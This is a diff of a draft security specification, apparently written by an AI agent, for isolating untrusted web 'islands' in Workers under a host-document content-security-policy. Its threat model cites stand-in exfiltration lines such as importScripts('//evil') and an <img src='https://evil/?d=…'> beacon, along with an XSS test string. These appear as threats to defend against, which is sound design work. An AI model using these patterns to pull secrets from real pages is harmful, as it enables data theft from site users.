@@ -2,7 +2,7 @@
 id: SPEC-050
 title: "Component Islands & Inter-Island Messaging"
 status: draft
-version: 0.11.0-strawman
+version: 0.12.0-strawman
 last-updated: 2026-06-25
 audience: agent, human
 ---
@@ -90,7 +90,7 @@ Q6 iframe cost — now largely moot under the default Worker model, Q8 controlle
 | ------------ | -------------------------------------------------------------------------------------- |
 | Document ID  | [[SPEC-050-component-islands-and-messaging\|SPEC-050]]                                  |
 | Title        | Component Islands & Inter-Island Messaging                                              |
-| Version      | 0.11.0-strawman                                                                         |
+| Version      | 0.12.0-strawman                                                                         |
 | Status       | Draft (strawman; NOT converged — pending Phase 1 + Phase 2 gates)                       |
 | Author       | Agent (Claude Opus 4.8 [1M], [[PROTO-001\|USDD Agent Protocol]] v1.11.0)                |
 | Date         | 2026-06-24                                                                              |
@@ -469,7 +469,9 @@ There SHALL be two island trust tiers, distinguished by author trust:
   **two render modes**, and (drawing on production prior art) the **Worker mode is the
   default** ([[SPEC-050-component-islands-and-messaging#ADR-5010]]):
   - **Controlled-element mode (DEFAULT, [[SPEC-050-component-islands-and-messaging#REQ-5025]]):**
-    the island runs in a **Web Worker** (no DOM, no `window`, no storage) and emits a
+    the island runs in a **Web Worker** (no DOM, no `window.zetl`; note it **does** retain
+    ambient network + same-origin storage — IndexedDB/Cache — confined per
+    [[SPEC-050-component-islands-and-messaging#REQ-5026]], *not* absent) and emits a
     **host-approved declarative element tree** that the trusted host paints into the page —
     the [[Shopify Remote DOM]] / [[worker-dom]] model. Untrusted code never produces HTML, so
     [[SPEC-050-component-islands-and-messaging#Threat M]] is closed *by construction*; the
@@ -483,6 +485,14 @@ There SHALL be two island trust tiers, distinguished by author trust:
   A content island (either mode) SHALL NOT obtain a publish capability for a trusted topic; it
   MAY be granted a **read-only** subscribe capability for one only when the theme explicitly
   declares the grant.
+
+  **Worker storage policy (residual).** A Worker retains same-origin **IndexedDB/Cache/storage**,
+  which CSP does **not** gate. This is *local* (does not by itself leave the device), so v1
+  accepts it, but records the residual honestly: a read-granted island could persist a subscribed
+  value locally, forming a **staged covert channel** if another same-origin context later reads it
+  and has egress. v1 does not partition per-island storage (the platform offers no per-Worker
+  storage scope); the egress-taint rule (REQ-5026/CON-5007) limits the *exit*, and operators who
+  need more SHOULD isolate untrusted content on a separate origin. Tracked as `[Blocked: Q10]`.
 
 This is the enforcement boundary the v0.1.0 strawman lacked: **realm isolation** (a Worker or
 an opaque-origin iframe, not topic-string namespacing) is what prevents a markdown author from
@@ -600,22 +610,40 @@ the worker-mode a11y contract ([[SPEC-050-component-islands-and-messaging#REQ-50
 
 ### REQ-5026: Content-Worker Confinement (Egress, Integrity, Render Rate)
 A content island's Worker (REQ-5025) is **untrusted code with ambient platform capabilities**;
-ADR-5010's "stronger isolation" is true for DOM/storage but **false for network** unless
-confined. The shell SHALL therefore:
-- **Egress.** Load the worker from a **`blob:` URL whose inline CSP sets `connect-src 'none'`**
-  (no `fetch`/`XHR`/`WebSocket`/`EventSource` out) **and `script-src` excluding remote**, so
-  `importScripts('//remote')` is blocked; the **host document CSP** SHALL also set `worker-src`
-  to `self`/`blob:` only. A theme MAY widen `connect-src` to an explicit host allowlist via a
-  declared grant, never to `*`. This is the Worker analogue of the REQ-5015 iframe CSP that the
-  v0.9.0 switch dropped.
-- **Integrity.** Because Subresource Integrity does **not** apply to `new Worker(url)`, the
-  build SHALL pin the worker script by a **content hash compared before instantiation** (load
-  the bytes, verify the hash, instantiate from a `blob:` of the verified bytes); a mismatch
-  fails closed (island does not start).
-- **Render rate.** Inbound `render` (and `publish`/`emit`) SHALL be **coalesced/rate-bounded**
-  (e.g. ≤ one paint per animation frame; excess dropped/coalesced; a per-island budget breach →
-  `denied:cap-exceeded`), symmetric with the REQ-5021 outbound debounce, so a worker loop
-  cannot saturate the host **main-thread** reconciler ([[SPEC-050-component-islands-and-messaging#Threat D]]).
+ADR-5010's "stronger isolation" is true for DOM but **false for network and local storage**
+unless confined. **The confinement mechanism is a host-document CSP, not a per-worker policy**
+— a subtlety v0.11.0 got wrong: a Worker's CSP comes from *its own script response header* when
+served over HTTP, and a `blob:`/same-origin worker **inherits the creating document's policy**;
+there is **no "inline CSP" in worker source**, and static/`file://` output has no per-worker
+response header. So a same-document Worker **cannot be given a network policy stricter than the
+host document's**. Confinement therefore works as follows:
+- **Egress is the host-document CSP, page-wide, theme/operator-owned.** The site SHALL be able to
+  ship a host-document CSP (via `<meta http-equiv="Content-Security-Policy">`, which applies on
+  static/`file://` output without a server, and/or response headers when served) with restrictive
+  `connect-src`, `worker-src` (`self`/`blob:`), and the **renderer fetch directives** `img-src`/
+  `media-src`/`font-src`/`style-src`/`default-src` (see the next bullet + CON-5007). The worker
+  inherits this. **There is no per-island egress widening** (it is impossible without widening the
+  whole page); any widening is a **trusted theme/operator** page-CSP decision, surfaced in the
+  audit graph (REQ-5009) — never a content-author manifest field.
+- **The renderer is itself an egress surface (Threat N).** Even with the worker confined, a
+  `render` tree can encode a granted value into an allowlisted remote URL
+  (`<img src="https://evil/?d=…">`) that the **host document** fetches. Two controls, both
+  required: (1) the host-document CSP above restricts `img-src`/`media-src`/etc.; (2) **CON-5007
+  taint rule** — a content island that holds **any granted trusted-topic read** MAY emit only
+  **same-origin/relative** URL attributes in its render tree (remote `src`/`srcset`/`href`/
+  `poster` rejected), so a read-granted island cannot beacon the secret out through the renderer.
+- **Integrity.** Subresource Integrity does **not** apply to `new Worker(url)`, so the build SHALL
+  pin the worker script by a **content hash compared before instantiation** (load bytes → verify
+  hash → instantiate from a `blob:` of the verified bytes); a mismatch fails closed.
+- **Render rate.** Inbound `render`/`publish`/`emit` SHALL be **coalesced/rate-bounded** (≤ one
+  paint per animation frame; excess coalesced; per-island budget breach → `denied:cap-exceeded`),
+  symmetric with the REQ-5021 outbound debounce, so a worker loop cannot saturate the host
+  **main-thread** reconciler ([[SPEC-050-component-islands-and-messaging#Threat D]]).
+- **Honest residual.** The strong "a granted read stays local" guarantee **requires** the
+  operator to ship the restrictive host-document CSP; on a `file://` deploy CSP enforcement is
+  browser-dependent, so confinement there is **best-effort, not guaranteed** — the spec states
+  this rather than implying an absolute guarantee. Local same-origin **storage** (IndexedDB/Cache)
+  is *not* gated by CSP at all ([[SPEC-050-component-islands-and-messaging#REQ-5010]] residual).
 
 **Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5026]], [[SPEC-050-component-islands-and-messaging#REQ-5025]], [[SPEC-050-component-islands-and-messaging#NFR-5002]]; [[SPEC-050-component-islands-and-messaging#Threat N]], [[SPEC-050-component-islands-and-messaging#Threat K]], [[SPEC-050-component-islands-and-messaging#Threat D]].
 
@@ -776,13 +804,16 @@ island script runs** — the object, its `store`/`bus` methods, and any exposed 
 non-writable/non-configurable, and internal topic/subscriber state is **closed over** (not
 reachable as a mutable property) — so one island cannot replace primitives or mutate retained
 state out from under the bus's own reference monitor or later islands; and (b) every
-build-emitted island `<script>` (trusted
-and content) SHALL carry a **Subresource Integrity** (`integrity="sha384-…"`) attribute so a
-tampered or substituted island asset fails to load. This does not make a malicious trusted
-island harmless (it runs first-party code by definition — [[SPEC-050-component-islands-and-messaging#Threat L]]),
-but it removes the cheapest escalations (primitive replacement, asset substitution).
+build-emitted island asset SHALL be integrity-pinned, **by mechanism appropriate to how it
+loads**: a `<script>` (trusted in-realm islands, and the iframe-escape-hatch bootstrap) SHALL
+carry **Subresource Integrity** (`integrity="sha384-…"`); a **content Worker** script — which
+loads via `new Worker(url)`, to which **SRI does not apply** — SHALL instead be pinned by the
+REQ-5026 **content-hash-before-instantiation** check. Either way a tampered or substituted island
+asset fails to load/start. This does not make a malicious trusted island harmless (it runs
+first-party code by definition — [[SPEC-050-component-islands-and-messaging#Threat L]]), but it
+removes the cheapest escalations (primitive replacement, asset substitution).
 
-**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5019]]; [[SPEC-050-component-islands-and-messaging#Threat L]].
+**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5019]], [[SPEC-050-component-islands-and-messaging#REQ-5026]]; [[SPEC-050-component-islands-and-messaging#Threat L]].
 
 ### REQ-5020: Island Accessibility (Both Render Modes)
 The accessibility contract differs by render mode:
@@ -985,7 +1016,9 @@ extensions). (+) **Dissolves the hardest bridge problems** — a `Worker` has no
 origin, no `event.source` ambiguity, no port-transfer race, and no `contentWindow` routing
 map; the parent holds the `Worker` reference and `postMessage`s it directly, so the four
 review passes' iframe-identity machinery (REQ-5016 bootstrap/`WindowProxy`) becomes
-escape-hatch-only. (+) Stronger isolation (a Worker has no DOM/`window`/storage at all) and
+escape-hatch-only. (+) Stronger DOM isolation (a Worker has no DOM/`window`; **but it keeps
+ambient network + same-origin storage**, which must be confined — REQ-5026 — not assumed absent;
+this was v0.11.0's error) and
 **inline rendering with page CSS** (no iframe layout/sizing pain — Q6). (−) The default mode
 cannot run arbitrary DOM or DOM-manipulating third-party libraries — those need the iframe
 escape hatch; and the host must ship a small renderer + element/attribute allowlist. Rejected:
@@ -1055,8 +1088,9 @@ render      = "render" "=" '"' render-mode '"' ;  (* content islands; default "w
 render-mode = "worker" | "iframe" ;         (* "worker" = controlled-element default; "iframe" = full-DOM escape hatch *)
 sandbox     = "sandbox" "=" bool ;          (* ONLY meaningful for render="iframe" (MUST be true); forbidden/ignored for render="worker" *)
 paints      = "paints" "=" bool ;           (* worker mode: grants the `render` capability (CON-5006/CON-5007); default false = headless *)
-connect-src = "connect-src" "=" "[" { '"' host '"' } "]" ;  (* worker egress allowlist; default [] = connect-src 'none' (REQ-5026) *)
 hydrate     = "hydrate" "=" '"' strategy '"' ;   (* default "load" — REQ-5024 *)
+(* NOTE: worker egress is a host-document CSP (REQ-5026), set by the TRUSTED theme/operator —
+   NOT a content-island manifest field. An untrusted author cannot widen their own egress. *)
 strategy    = "load" | "idle" | "visible" | "visible(" rootmargin ")" | "media(" css-query ")" ;
 topics      = "[island.topics]" , { topic-decl } ;
 topic-decl  = quoted-topic "=" inline-table ;               (* e.g. "search:open" = { type = "bool" } *)
@@ -1075,13 +1109,15 @@ whose **TOML value conforms to its declared type** (CON-5005); a content-author 
 `publishes` are all `content:`-prefixed (REQ-5011); a content island's `render` is `"worker"`
 (default) or `"iframe"`; **`sandbox` is meaningful ONLY for `render = "iframe"`** (where it
 MUST be `true`) and is forbidden/ignored for `render = "worker"` (a Worker is isolated by
-construction — there is no iframe to sandbox); `paints`/`connect-src` are meaningful only for
-`render = "worker"` (default `paints = false`, `connect-src = []`); a content island's
-`subscribes` of a trusted topic requires a matching `[[theme.island-grants]]` entry; a
-`hydrate` value matches `strategy` (REQ-5024), defaulting to `"load"`.
+construction — there is no iframe to sandbox); `paints` is meaningful only for
+`render = "worker"` (default `false` = headless); **worker egress is NOT a manifest field** — it
+is the trusted theme/operator's host-document CSP (REQ-5026), so an untrusted author cannot widen
+their own network access; a content island's `subscribes` of a trusted topic requires a matching
+`[[theme.island-grants]]` entry; a `hydrate` value matches `strategy` (REQ-5024), defaulting to
+`"load"`.
 **Post-conditions:** typed island metadata feeding wiring verification (REQ-5008), the
-audit graph (REQ-5009, incl. render mode + `paints`/`connect-src` grants), the bridge grant
-table (REQ-5016), payload typing (REQ-5013), and the hydration trigger (REQ-5024).
+audit graph (REQ-5009, incl. render mode + `paints` grant + the page's egress CSP), the bridge
+grant table (REQ-5016), payload typing (REQ-5013), and the hydration trigger (REQ-5024).
 **Error model:** malformed topic → `island-topic-malformed`; persisted-without-default or
 default-not-of-type → `island-persisted-no-default`; a content island with `render = "iframe"`
 publishing a non-`content:` topic or lacking `sandbox = true` → `island-content-unsandboxed`
@@ -1299,6 +1335,13 @@ the allowlist → **node dropped** (`denied:render`), never coerced.
 - URL attributes (`href`, `src`, `srcset`, `poster`, `action`, `formaction`, `cite`) →
   **scheme-allowlisted**: `https`, `http`, `mailto`, and relative URLs only; `javascript:`,
   `data:`, `blob:`, `vbscript:`, `file:` → rejected.
+- **Egress-taint rule (closes the renderer exfil channel, Threat N).** A remote `src`/`srcset`/
+  `poster`/`href` the *host document* fetches is an egress path the worker's confinement cannot
+  see. Therefore an island that holds **any granted trusted-topic read** ([[theme.island-grants]])
+  MAY emit only **same-origin / relative** URL attributes — a remote `http(s)` URL in its render
+  tree is **rejected** — so it cannot beacon a subscribed value out via `<img src>`. (A
+  *read-free* content island may use remote URLs, still bounded by the page `img-src`/`media-src`
+  CSP of REQ-5026.)
 - `aria-*` and `role` → **allowlisted** (required for the REQ-5020 a11y contract).
 - all other attrs → only if in `ATTR-ALLOWLIST(tag)`, value rendered as a string via
   **`setAttribute`** (never DOM-property assignment, never string concatenation into markup).
@@ -1457,17 +1500,23 @@ channel ([[SPEC-050-component-islands-and-messaging#Threat N]]). The parent brid
 reference monitor — no island can widen its own grant (REQ-5016).
 
 ### Threat N: Content-Worker Egress / Remote Code Pull *(default mode)*
-A content island's Worker uses the platform's **ambient** `fetch`/`XHR`/`WebSocket`/
-`importScripts`/`IndexedDB` to (a) **exfiltrate** data it legitimately received (a granted
-trusted-topic `subscribe`, or any page data passed to it) to an attacker server, and/or (b)
-**pull remote untrusted code** at runtime via `importScripts('//evil')`, defeating the
-build-time wiring audit and the script integrity pin. "No DOM" (ADR-5010) is **not** "no
-network." **Mitigation (REQ-5026):** the worker is loaded from a **`blob:` URL whose CSP sets
-`connect-src 'none'` + remote-`script-src` off** (so `fetch`/sockets/`importScripts('//…')` all
-fail), the host document CSP restricts `worker-src`, and the worker script is **integrity-pinned
-by content hash before instantiation** (SRI does not cover `new Worker`). A theme may widen
-`connect-src` only to an explicit host allowlist, surfaced in the audit graph. This restores the
-confinement the REQ-5015 iframe CSP gave and the v0.9.0 Worker switch had dropped.
+A content island's Worker exfiltrates a value it legitimately received (a granted trusted-topic
+`subscribe`) via **three distinct channels**: (a) **direct worker network** —
+`fetch`/`XHR`/`WebSocket`; (b) **remote code pull** — `importScripts('//evil')`, defeating the
+build audit + integrity pin; (c) **the renderer** — encoding the value into an allowlisted
+remote URL (`<img src="https://evil/?d=…">`) that the **host document**, not the worker, fetches.
+"No DOM" (ADR-5010) is **not** "no network," and the worker's own confinement does **not** cover
+channel (c). **Mitigation (REQ-5026, corrected from v0.11.0's unimplementable per-worker CSP):**
+confinement is the **host-document CSP** the trusted operator ships (`<meta http-equiv>` works on
+static/`file://` without a server; the `blob:`/same-origin worker **inherits** the document
+policy — there is no per-worker inline CSP): restrictive `connect-src` + `worker-src` close (a),
+remote-excluding `script-src` closes (b), and `img-src`/`media-src`/`font-src`/`style-src` plus
+the **CON-5007 egress-taint rule** (a read-granted island may emit only same-origin URLs) close
+(c). The worker script is **integrity-pinned by content hash before `new Worker`** (SRI does not
+apply). Egress widening is a **trusted** page-CSP decision (audit graph), never a content-author
+field. **Honest residual:** the guarantee requires the operator to ship the CSP; `file://`
+enforcement is browser-dependent (best-effort there); and local same-origin **storage**
+(IndexedDB/Cache) is not CSP-gated at all — see [[SPEC-050-component-islands-and-messaging#REQ-5010]].
 
 ### Threat L: Compromised / Supply-Chained Trusted Island
 A trusted in-realm island ships malicious or supply-chain-compromised JS — it has ambient
@@ -1514,8 +1563,8 @@ island imports.
 ### TEST-5008: Manifest Topics + Wiring Verification + Graph
 **Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5008]], [[SPEC-050-component-islands-and-messaging#REQ-5009]], [[SPEC-050-component-islands-and-messaging#CON-5002]]. Positive: publisher/subscriber pair resolves; wiring graph shows the edge. Negative-input: malformed topic → `island-topic-malformed`; subscriber with no publisher → `island-topic-unpublished` (warning); island publishing an undeclared topic → `island-topic-undeclared` (warning); content island subscribing a trusted topic with no grant → `island-capability-ungranted` (error). Negative-output: the graph lists every dangling edge.
 
-### TEST-5010: Two Trust Tiers — In-Realm vs Sandboxed
-**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5010]], [[SPEC-050-component-islands-and-messaging#Threat A]]. Positive: a theme island runs in-realm with direct `window.zetl`; a content island renders inside a sandboxed iframe. Negative-input: a content component without `sandbox = true`, or publishing a non-`content:` topic → build error. Negative-output: the content iframe has no reference to the parent `window.zetl` (opaque origin; `window.parent.zetl` is unreachable).
+### TEST-5010: Two Trust Tiers — In-Realm vs Isolated (Both Render Modes)
+**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5010]], [[SPEC-050-component-islands-and-messaging#REQ-5025]], [[SPEC-050-component-islands-and-messaging#Threat A]]. Positive: a theme island runs in-realm with direct `window.zetl`; a **default** content island runs in a **Worker** (no DOM, no `window.zetl`); an `render="iframe"` content island runs in a sandboxed iframe. Negative-input: a content component publishing a non-`content:` topic → build error (any mode); `sandbox` on a `render="worker"` island → `island-render-invalid`; missing `sandbox=true` on a `render="iframe"` island → `island-content-unsandboxed` (iframe-mode-scoped only). Negative-output: neither a content Worker nor a content iframe can reach the parent `window.zetl` (Worker has no `window`; iframe is opaque-origin).
 
 ### TEST-5013: Typed Payload Recognition
 **Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5013]], [[SPEC-050-component-islands-and-messaging#CON-5005]], [[SPEC-050-component-islands-and-messaging#Threat H]]. Positive: an `enum("light","dark")` `theme` accepts `"dark"`. Negative-input: `set("blue")` or an object → `island-payload-type`, dropped, subscribers unaffected; two publishers declaring incompatible types → `island-topic-type-conflict` at build. Negative-output: no subscriber, persisted read, or bridge delivery ever yields an unrecognised value.
@@ -1532,11 +1581,11 @@ island imports.
 ### TEST-5018: Persisted Pre-Paint Script
 **Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5018]], [[SPEC-050-component-islands-and-messaging#CON-5005]], [[SPEC-050-component-islands-and-messaging#Threat F]]. Positive: a returning visitor's persisted `theme` is applied before first paint (no flash); the snippet is admitted by its `'sha256-…'` CSP source. Negative-input: a poisoned/oversized/`null` stored value → declared default applied, no exception escapes the `try/catch`. Negative-output: the snippet never interprets the stored string as code/markup; a page with no persisted topic and no island emits no pre-paint script (REQ-5012).
 
-### TEST-5019: Trusted-Island Hardening
-**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5019]], [[SPEC-050-component-islands-and-messaging#Threat L]]. Positive: `window.zetl` is frozen before islands run; emitted island `<script>`s carry `integrity`. Negative-input: an island attempting `window.zetl.store = …` fails (frozen); a tampered island asset (hash mismatch) fails to load. Negative-output: a later island still sees the genuine `store`/`bus` primitives after an earlier island's mutation attempt.
+### TEST-5019: Island Asset Hardening (Mode-Aware Integrity)
+**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5019]], [[SPEC-050-component-islands-and-messaging#REQ-5026]], [[SPEC-050-component-islands-and-messaging#Threat L]]. Positive: `window.zetl` is frozen before islands run; trusted + iframe-mode island `<script>`s carry SRI `integrity`; a **content Worker** script is pinned by the REQ-5026 **content-hash-before-`new Worker`** check (SRI does not apply to `new Worker`). Negative-input: `window.zetl.store = …` fails (frozen); a tampered `<script>` asset (SRI mismatch) fails to load; a tampered **Worker** script (hash mismatch) → island does not start. Negative-output: a later island still sees genuine `store`/`bus` primitives after a mutation attempt.
 
-### TEST-5020: Sandboxed-Island Accessibility
-**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5020]], [[SPEC-050-component-islands-and-messaging#REQ-5002]]. Positive: the iframe carries a meaningful `title`; the frame sits in document tab order. Negative-input: a content island that auto-focuses/traps focus → `island-focus-trap` warning. Negative-output: information shown only inside the iframe has a parent-HTML (no-JS) equivalent (WCAG 2.2 AA).
+### TEST-5020: Island Accessibility (Both Render Modes)
+**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5020]], [[SPEC-050-component-islands-and-messaging#REQ-5025]], [[SPEC-050-component-islands-and-messaging#REQ-5002]]. Positive (default Worker): the painted subtree sits inline in document tab order, and CON-5007 admits the `aria-*`/`role` needed for accessible names. Positive (iframe escape hatch): the iframe carries a meaningful `title` and sits in document tab order. Negative-input: an island that auto-focuses/traps focus → `island-focus-trap` warning (either mode). Negative-output: information surfaced only after hydration has a no-JS parent-HTML equivalent (WCAG 2.2 AA).
 
 ### TEST-5022: Recognition ≠ Output Safety
 **Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5022]], [[SPEC-050-component-islands-and-messaging#Threat M]]. Positive: a content island manifest publishing only `bool`/`int`/`number`/`enum` content topics builds. Negative-input: a content island declaring a `string`-typed (or string-bearing record) **published** topic → `island-content-value-type` build error. Negative-output: a conformant `string` value (e.g. `"<img onerror=…>"`) delivered to a subscriber is inert when the subscriber follows the obligation (assert `textContent` rendering, not `innerHTML`); the producer-restriction means no untrusted-authored value can be free text.
@@ -1665,6 +1714,12 @@ everything else composes [[SPEC-048]] and [[SPEC-028]].
   The iframe machinery the four reviews hardened is retained verbatim but scoped to the escape
   hatch. *Left to IMPL-050:* the element/attribute allowlist vocabulary and the `tree` wire
   shape.
+- **Q10 — Worker same-origin storage (IndexedDB/Cache) is not CSP-gated.** A content Worker keeps
+  ambient same-origin storage that no CSP directive restricts (REQ-5010 residual). v1 accepts it
+  as *local* (not direct egress) but it forms a **staged covert channel** with a later same-origin
+  context that has egress. Options for v2: serve untrusted content from a **separate origin** (the
+  only real storage partition the platform offers), a storage-clearing teardown, or accept-and-
+  document. Ground against the operator-deployment profile in Phase 1. (`[Blocked: Q10]`.)
 
 ---
 
@@ -1730,20 +1785,55 @@ puts `render` inside the capability model; framing/ADR clauses (ADR-5003, §1.2,
 §1.4) retracted the stale iframe-only teaching. **This is the lesson of the whole arc in one
 pass:** a "by construction" claim is only as strong as the construction you actually specify —
 moving to a simpler architecture deleted controls, and asserting their absence as a *strength*
-(ADR-5010's "no storage at all") hid a live exfil channel. **NOT converged:** v0.11.0's own
-fixes (CON-5007's vector completeness, the bound values, the egress CSP) have not themselves had
-a clean-context pass, and the recurring pattern is that each fix needs re-checking. The terminal
-gate is firmer than ever: a **human security expert** + **executable fuzzing** of the CON-5007
-renderer (the full XSS vector matrix incl. SVG/CSS/mXSS), the recursive `tree` recogniser
-(depth/breadth/cycle), and Worker egress under a granted subscribe — benchmarked against Remote
-DOM and worker-dom. AI review has materially improved this spec but should not certify it.
+(ADR-5010's "no storage at all") hid a live exfil channel.
+
+**The sixth pass (v0.12.0) proved that point again — on v0.11.0's *own* fix.** A fresh
+cross-model pass (checked against MDN's Worker-CSP semantics) found the B3 egress fix was
+**unimplementable as written**: there is **no "inline CSP" in a Worker** — a blob/same-origin
+Worker *inherits the host-document CSP*, and static/`file://` output has no per-worker response
+header, so a same-document Worker cannot be given a stricter network policy than the page.
+Worse, v0.11.0 had put the egress allowlist in the *untrusted author's* manifest (self-widening),
+and missed that the **host-painted `<img src>` is itself an egress channel** the worker's CSP
+can't see. v0.12.0 corrects all three: egress is a **host-document CSP** (meta-settable,
+page-wide, trusted-operator-owned — no per-worker policy, no author field); the renderer channel
+is closed by `img-src`/`media-src` CSP **plus** a **CON-5007 egress-taint rule** (a read-granted
+island may emit only same-origin URLs); SRI is mode-aware (Workers use a hash-before-`new Worker`
+pin); and the "no storage" claim is retracted (IndexedDB/Cache are real and un-CSP-gated —
+Q10). **NOT converged, and the trend is the lesson:** six passes, and each fix to the
+content-island confinement has needed the next pass to catch a browser-primitive subtlety the
+previous one got wrong (inline-CSP that doesn't exist, author-set egress, renderer-as-egress).
+This is precisely the class of error that **only a human security expert with a running PoC**
+should sign off — the confinement rests on exact CSP/Worker/`file://` behaviour that prose
+review keeps mis-stating. The terminal gate is unchanged and now urgent: human review +
+executable fuzzing of (a) the CON-5007 renderer (full XSS matrix incl. SVG/CSS/mXSS), (b) the
+recursive `tree` recogniser (depth/breadth/cycle), (c) Worker + renderer egress under a granted
+subscribe across served **and** `file://` deploys. AI review has materially improved this spec —
+visibly, across six passes — but should **not** certify it.
 
 ---
 
 ## Changelog
 
 <details>
-<summary>Revision history — 0.1.0 → 0.11.0</summary>
+<summary>Revision history — 0.1.0 → 0.12.0</summary>
+
+- **0.12.0** (2026-06-25) — *sixth pass: corrects v0.11.0's egress fix (3 Blocking / 3 Major),
+  checked against MDN Worker-CSP semantics.* **B1:** the "blob worker with inline CSP" mechanism
+  **does not exist** — a blob/same-origin Worker *inherits the host-document CSP*, and static/
+  `file://` has no per-worker response header, so a same-document Worker cannot be confined more
+  tightly than the page. REQ-5026 rewritten: egress is the **host-document CSP** (meta-settable
+  for static; worker inherits it), no per-worker policy. **B2:** removed `connect-src` from the
+  (untrusted) content-island manifest — egress widening is a **trusted theme/operator** page-CSP
+  decision, surfaced in the audit graph; an author cannot widen their own egress. **B3:** the
+  host-painted `<img src>` is itself an egress channel the worker CSP can't see → closed by
+  `img-src`/`media-src` CSP **plus** a new **CON-5007 egress-taint rule** (a read-granted island
+  may emit only same-origin URLs). **Majors:** TEST-5010/TEST-5020 de-iframe'd (both modes);
+  REQ-5019/TEST-5019 SRI made mode-aware (Workers use a hash-before-`new Worker` pin, since SRI
+  doesn't apply); the "Worker has no storage" claim retracted in REQ-5010/ADR-5010 (IndexedDB/
+  Cache are real and un-CSP-gated) + new residual + **Q10**. §13 records the arc: six passes, each
+  catching a CSP/Worker browser-primitive subtlety the prior fix mis-stated — the terminal gate
+  (human expert + running PoC) is now urgent, not optional. Honest residual: on `file://`,
+  confinement is best-effort.
 
 - **0.11.0** (2026-06-25) — *fifth adversarial pass: the Worker model (3 Blocking / 5 Major / 5
   Minor), all applied.* The pass confirmed v0.9.0 **oversold** "Threat M closed by construction."
